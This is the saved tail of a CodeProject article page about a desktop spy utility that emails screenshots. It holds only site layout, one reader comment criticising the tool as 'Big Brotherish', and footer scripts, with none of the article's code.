      <TABLE class=ArticleUneditedHeader id=ctl00_RateArticleRow cellSpacing=0 
      cellPadding=0 width="100%" border=0>
        <TBODY>
        <TR>
          <TD><A 
            href="http://www.codeproject.com/KB/miscctrl/desktopspy.aspx#_top">Article 
            Top</A></TD>
          <TD align=right>
            <FORM id=aspnetForm 
            style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-TOP: 0px" 
            name=aspnetForm action=desktopspy.aspx method=post>
            <DIV><INPUT id=__VIEWSTATE type=hidden 
            value=/wEPDwULLTEwMDUyNjYzMjhkZM+5a9ewa/fa6eZT/R9RPsuNMROD 
            name=__VIEWSTATE> </DIV>
            <TABLE cellSpacing=0 cellPadding=0 width="100%">
              <TBODY>
              <TR>
                <TD class=SmallText style="WHITE-SPACE: nowrap" align=right>
                  <TABLE>
                    <TBODY>
                    <TR>
                      <TD id=ctl00_RateArticle_SignIn><A 
                        href="http://www.codeproject.com/KB/miscctrl/desktopspy.aspx#SignUp">Sign 
                        Up</A> to vote for this article</TD>
                      <TD><SPAN 
                    id=ctl00_RateArticle_ErrorMessage></SPAN></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></FORM></TD></TR></TBODY></TABLE>
      <DIV 
      style="PADDING-RIGHT: 10px; PADDING-LEFT: 10px; PADDING-BOTTOM: 10px; OVERFLOW: hidden; PADDING-TOP: 10px; WHITE-SPACE: nowrap; TEXT-ALIGN: center">
      <SCRIPT type=text/javascript>document.write("<a href=\"http://www.codeproject.com/Redir.aspx?adid=4288&way=ban\" target=\"_blank\" rel=\"nofollow\"><img src=\"http://www.codeproject.com/script/Ann/ServeImg.aspx?File=%2fscript%2fadmentor%2fimages%2fCWS_charting_468x60.jpg&C=False&id=4288\" alt=\"\" border=\"0\" width=\"468\" height=\"60\"></a>");</SCRIPT>
      <IFRAME 
      src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/ServeLinks.htm" 
      frameBorder=0 width=300 scrolling=no height=60></IFRAME></DIV><A 
      name=_comments></A><!-- Forum Start -->
      <DIV id=_MessageBoard onclick="return SwitchMessage(event, null)">
      <TABLE class=Frm_MainTable id=ForumTable cellSpacing=0 cellPadding=0>
        <TBODY>
        <TR>
          <TD class=Frm_MsgAlert><B>You must <A 
            href="http://www.codeproject.com/script/Membership/LogOn.aspx?rp=%2fKB%2fmiscctrl%2fdesktopspy.aspx%3ffid%3d957756%26df%3d90%26mpp%3d25%26noise%3d3%26sort%3dPosition%26view%3dQuick">Sign 
            In</A> to use this message board.</B></TD></TR>
        <FORM 
        action=/script/Forums/SetOptions.aspx?floc=%2fKB%2fmiscctrl%2fdesktopspy.aspx&amp;fid=957756&amp;df=90&amp;mpp=25&amp;noise=3&amp;sort=Position&amp;view=Quick 
        method=get>
        <TR>
          <TD><INPUT type=hidden value=957756 name=fid><INPUT type=hidden 
            value=?floc=%2fKB%2fmiscctrl%2fdesktopspy.aspx&amp;fid=957756&amp;df=90&amp;mpp=25&amp;noise=3&amp;sort=Position&amp;view=Quick 
            name=currentQS><INPUT type=hidden value=/KB/miscctrl/desktopspy.aspx 
            name=floc>
            <TABLE cellSpacing=0 cellPadding=3 width="100%" border=0>
              <TBODY>
              <TR class=Frm_HeaderRow1>
                <TD style="WHITE-SPACE: nowrap"><IMG height=16 
                  src="/script/Forums/Images/forum_faq.gif" width=16 
                  align=absMiddle border=0>&nbsp;<A 
                  href="http://www.codeproject.com/script/Forums/FAQ.aspx"><B>FAQ</B></A>&nbsp;</TD>
                <TD></TD>
                <TD style="WHITE-SPACE: nowrap; TEXT-ALIGN: right" 
                  colSpan=2><IMG height=15 
                  src="/script/Forums/Images/forum_search.gif" width=16 
                  align=absMiddle border=0>&nbsp;<A 
                  href="http://www.codeproject.com/script/Forums/Search.aspx?fid=957756">Search 
                  comments</A>&nbsp;</TD>
                <TD style="TEXT-ALIGN: right"><INPUT class=Frm_Button type=submit value="Set Options" name=submit></TD></TR>
              <TR class=Frm_HeaderRow2>
                <TD style="WIDTH: 100%">&nbsp;</TD>
                <TD 
                  style="WHITE-SPACE: nowrap; TEXT-ALIGN: right">Layout<SELECT 
                  class=Frm_DropDown size=1 name=view> <OPTION value=Quick 
                    selected>Normal</OPTION><OPTION value=Topic>Expand Root 
                    Messages</OPTION><OPTION value=Expanded>Expand All 
                    Messages</OPTION><OPTION value=Thread>Thread 
                    View</OPTION><OPTION value=Normal>No Javascript 
                    (slow)</OPTION><OPTION value=Preview>No Javascript 
                    Preview</OPTION></SELECT>&nbsp;&nbsp;</TD>
                <TD style="WHITE-SPACE: nowrap">Per page<SELECT 
                  class=Frm_DropDown size=1 name=mpp> <OPTION 
                    value=10>10</OPTION><OPTION value=25 
                    selected>25</OPTION><OPTION 
                  value=50>50</OPTION></SELECT>&nbsp;&nbsp;</TD>
                <TD colSpan=2>&nbsp;</TD></TR></TBODY></TABLE></TD></TR></FORM>
        <TR>
          <TD><A name=xx0xx></A>
            <TABLE cellSpacing=0 cellPadding=2 width="100%" border=0>
              <TBODY>
              <TR class=Frm_NavigationBar>
                <TD>&nbsp;</TD>
                <TD>Msgs 1 to 1 of 1 (Total in Forum: 1) (<A 
                  href="http://www.codeproject.com/KB/miscctrl/desktopspy.aspx?fid=957756&amp;df=90&amp;mpp=25&amp;noise=3&amp;sort=Position&amp;view=Quick">Refresh</A>)</TD>
                <TD style="WHITE-SPACE: nowrap; TEXT-ALIGN: right"><SPAN 
                  class=Frm_HL>First</SPAN><SPAN class=Frm_HL>Prev</SPAN><SPAN 
                  class=Frm_HL>Next</SPAN></TD></TR></TBODY></TABLE></TD></TR>
        <TR>
          <TD><!-- Column Headers -->
            <TABLE class=Frm_MsgTable cellSpacing=0 cellPadding=0 width="100%" 
            border=0>
              <TBODY>
              <TR class=Frm_ColumnHeaders>
                <TD style="WIDTH: 100%">
                  <TABLE cellSpacing=0 cellPadding=2 width="100%" border=0>
                    <TBODY>
                    <TR>
                      <TD>Subject&nbsp;</TD>
                      <TD class=Frm_MsgAuthor>&nbsp;Author&nbsp;</TD>
                      <TD 
              class=Frm_MsgDate>Date&nbsp;</TD></TR></TBODY></TABLE></TD></TR>
              <TR>
                <TD><IMG height=5 src="/script/Forums/Images/t.gif" width=1 
                  border=0></TD></TR><!-- Start Message head -->
              <TR class="MsgHd Rt HdUnSel " id=2374083_h0>
                <TD width="100%">
                  <TABLE class=QuickHd cellSpacing=0 cellPadding=0 width="100%" 
                  border=0>
                    <TBODY>
                    <TR>
                      <TD class=Frm_MsgIndent width=16><A 
                        name=xx2374083xx></A><IMG height=16 
                        src="/script/Forums/Images/msg_general.gif" width=16 
                        valign="absmiddle"></TD>
                      <TD class=Frm_MsgSubject><A id=DynMessLink 
                        href="http://www.codeproject.com/KB/miscctrl/desktopspy.aspx?fid=957756&amp;df=90&amp;mpp=25&amp;noise=3&amp;sort=Position&amp;view=Quick&amp;select=2374083#xx2374083xx" 
                        name=2374083>Teaching young programmers how to join Big 
                        Brother</A></TD>
                      <TD style="WIDTH: 20px; WHITE-SPACE: nowrap"><IMG 
                        title=member height=16 
                        src="/script/Membership/Images/member_sm.gif" 
                      border=0></TD>
                      <TD class=Frm_MsgAuthor><A 
                        href="http://www.codeproject.com/script/Membership/Profiles.aspx?mid=49456">jconwell</A></TD>
                      <TD class=Frm_MsgDate 
                      style="VERTICAL-ALIGN: top; WHITE-SPACE: nowrap">6:06 31 
                        Dec '07 &nbsp;</TD></TR></TBODY></TABLE></TD></TR><!-- End Message head -->
              <TR id=2374083_h1 style="DISPLAY: none">
                <TD style="WIDTH: 100%">
                  <TABLE class=QuickBd cellSpacing=0 cellPadding=0 width="100%" 
                  border=0>
                    <TBODY>
                    <TR>
                      <TD class=Frm_MsgIndent style="WIDTH: 16px"></TD>
                      <TD class="MsgBd BdSel ">
                        <TABLE cellSpacing=5 cellPadding=0 width="100%" 
border=0>
                          <TBODY>
                          <TR>
                            <TD>
                              <TABLE cellSpacing=0 cellPadding=0 width="100%" 
                              border=0>
                                <TBODY>
                                <TR>
                                <TD colSpan=2>hmmm...interesting article. A bit 
                                too big brotherish for me. Why not add a 
                                keyboard sniffer to it while your at it <IMG 
                                src="/script/Forums/Images/smiley_smile.gif" 
                                align=absMiddle> <BR><BR>
                                <DIV class=ForumSig>John 
                                Conwell<BR></DIV><BR></TD></TR>
                                <TR style="VERTICAL-ALIGN: top">
                                <TD class=Frm_MsgFt><A class=Frm_MHL 
                                href="http://www.codeproject.com/script/Membership/LogOn.aspx?rp=%2fKB%2fmiscctrl%2fdesktopspy.aspx">Sign 
                                In</A>·<A class=Frm_MHL title="View Thread" 
                                href="http://www.codeproject.com/KB/miscctrl/desktopspy.aspx?fid=957756&amp;df=90&amp;mpp=25&amp;sort=Position&amp;tid=2374083">View 
                                Thread</A>·<A class=Frm_MHL 
                                title="Get permanent link" 
                                href="http://www.codeproject.com/script/Forums/View.aspx?fid=957756&amp;msg=2374083">PermaLink</A></TD>
                                <TD class=Frm_MsgFt 
                                style="TEXT-ALIGN: right"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
              <TR>
                <TD><IMG height=5 src="/script/Forums/Images/t.gif" width=1 
                  border=0></TD></TR></TBODY></TABLE></TD></TR>
        <TR>
          <TD>
            <TABLE cellSpacing=0 cellPadding=2 width="100%">
              <TBODY>
              <TR class=Frm_Footer>
                <TD>Last Visit: Sunday, March 2, 2008 12:09 AM &nbsp; &nbsp; 
                  Last Update:Sunday, March 2, 2008 12:09 AM</TD>
                <TD 
              style="WHITE-SPACE: nowrap; TEXT-ALIGN: right"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV>
      <P class=SmallText><IMG height=16 
      src="/script/Forums/Images/msg_general.gif" width=16 align=absMiddle> 
      General &nbsp;&nbsp; <IMG height=16 
      src="/script/Forums/Images/msg_news.gif" width=16 align=absMiddle> News 
      &nbsp;&nbsp; <IMG height=16 src="/script/Forums/Images/msg_question.gif" 
      width=16 align=absMiddle> Question &nbsp;&nbsp; <IMG height=16 
      src="/script/Forums/Images/msg_answer.gif" width=16 align=absMiddle> 
      Answer &nbsp;&nbsp; <IMG height=16 
      src="/script/Forums/Images/msg_joke.gif" width=16 align=absMiddle> Joke 
      &nbsp;&nbsp; <IMG height=16 src="/script/Forums/Images/msg_admin.gif" 
      width=16 align=absMiddle> Admin &nbsp;&nbsp; </P><!-- Forum End --></DIV>
      <TABLE width="100%">
        <TBODY>
        <TR vAlign=top>
          <TD class=TinyText align=left><A id=ctl00_PermaLink 
            href="http://www.codeproject.com/script/Articles/Article.aspx?aid=22543">PermaLink</A> 
            | <A id=ctl00_PrivacyLink 
            href="http://www.codeproject.com/info/privacy.aspx">Privacy </A>| <A 
            id=ctl00_TermsOfUseLink 
            href="http://www.codeproject.com/info/TermsOfUse.aspx">Terms of 
            Use</A> <BR>Last Updated: 29 Dec 2007<BR>Editor: <A 
            id=ctl00_ArticleEditor></A><BR></TD>
          <TD class=TinyText vAlign=top align=right>Copyright 2007 by Omar Al 
            Zabir<BR>Everything else Copyright © <A 
            href="mailto:webmaster@codeproject.com">CodeProject</A>, 
            1999-2008<BR>Web12 | <A id=ctl00_AdvertiseLink 
            href="http://www.codeproject.com/info/MediaKit.aspx">Advertise on 
            the Code Project </A></TD></TR></TBODY></TABLE></TD></TR>
  <TR>
    <TD align=middle colSpan=2></TD></TR></TBODY></TABLE>
<SCRIPT language=Javascript 
src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/front.asp" 
type=text/javascript></SCRIPT>

<SCRIPT language=Javascript type=text/javascript><!--
if (document.all) try {window.attachEvent("oncopy",copyCode);}catch(e){};
--></SCRIPT>

<SCRIPT language=Javascript 
src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/TogglePre.js" 
type=text/javascript></SCRIPT>

<SCRIPT language=Javascript 
src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/menu132_com.js" 
type=text/javascript></SCRIPT>

<SCRIPT language=Javascript 
src="CodeProject Desktop spy utility that emails subject's screenshots to you_ Free source code and programming help_files/TopNavBar.js" 
type=text/javascript></SCRIPT>

<SCRIPT language=Javascript type=text/javascript><!--
new HVMenu(new menu_NavbarConfig());
--></SCRIPT>
</BODY></HTML>
